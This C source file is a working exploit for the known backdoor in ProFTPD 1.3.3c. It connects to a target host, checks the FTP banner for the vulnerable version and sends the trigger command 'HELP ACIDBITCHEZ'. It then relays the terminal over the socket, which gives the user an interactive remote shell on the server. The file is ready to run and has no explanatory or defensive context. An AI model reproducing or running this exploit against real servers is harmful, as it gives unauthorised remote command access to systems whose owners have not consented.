#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <pthread.h>
#include <error.h>
#include <stddef.h>
#include <unistd.h>

#define VULN_VERSION "ProFTPD 1.3.3c"

typedef struct stream
{
    int src;
    int dst;
} stream_t;

void *stream_con(void *generic)
{
    stream_t s = *(stream_t *)generic;
    int bytes = 0;
    char buffer[0x10000] = {0};

    while ((bytes = read(s.src, buffer, 0xFFFF))) {

        if (bytes < 0) {
            perror("error");
            break;
        }
        
        if (write(s.dst, buffer, bytes) < 0) {
            perror("error");
            break;
        }
    }

    return (NULL);
}

uint8_t get_shell(int fd)
{
    pthread_t th_id;
    stream_t stream;
    int bytes = 0;
    char buffer[0x10000] = {0};

    
    stream.src = STDIN_FILENO;
    stream.dst = fd;

    if (pthread_create(&th_id, NULL, stream_con,&stream)) {
        perror("error");
        return (1);
    }

    while ((bytes = read(fd, buffer, 0xFFFF))) {
        
        if (bytes < 0) {
            perror("error");
            break;
        }

        if (write(STDOUT_FILENO, buffer, bytes) < 0) {
            perror("error");
            break;
        }
    }

    pthread_cancel(th_id);
    pthread_join(th_id, NULL);

    return (0);
}

short str_to_short(const char *str)
{
    short to_short = 0;

    while (*str && *str >= '0' && *str <= '9') {
        to_short *= 10;
        to_short += *(str)++ & 0xF;
    }

    return (to_short);
}

uint8_t check_version(char *buffer)
{
    char *version = VULN_VERSION;

    while (*buffer && *version) 
        if (*(buffer)++ == *version)
            version++;
    
    
    return ((*version == 0) ? 0 : 1);
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr, "usage : %s <ip> <port>", argv[0]);
        return (1);
    }

    struct sockaddr_in socks = {0};
    int fd = 0;
    char version[0x100] = {0};

    if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        perror("error");
        return (1);
    }

    socks.sin_addr.s_addr = inet_addr(argv[1]); // convert str to network byte order
    socks.sin_port = htons(str_to_short(argv[2])); // convert short to network byte order
    socks.sin_family = AF_INET;

    if (connect(fd, (struct sockaddr *)&socks, sizeof(socks)) < 0) {
        perror("error");
        return (1);
    }

    if (recv(fd, version, 0xFF, 0) < 0) {
        perror("error");
        close(fd);
        return (1);
    }

    printf("Version : %s\n", version);

    if (check_version(version)) {
        fprintf(stderr, "[-] Version is not vulnerable !\n");
        close(fd);
        return (1);
    }

    if (send(fd, "HELP ACIDBITCHEZ\r\n", 18, 0) < 0) {
        perror("error");
        close(fd);
        return (1);
    }

    printf("[+] Shell opened !\n");

    if (get_shell(fd))
        fprintf(stderr, "[-] Error in get_shell !\n");
    
    close(fd);

    return (0);
}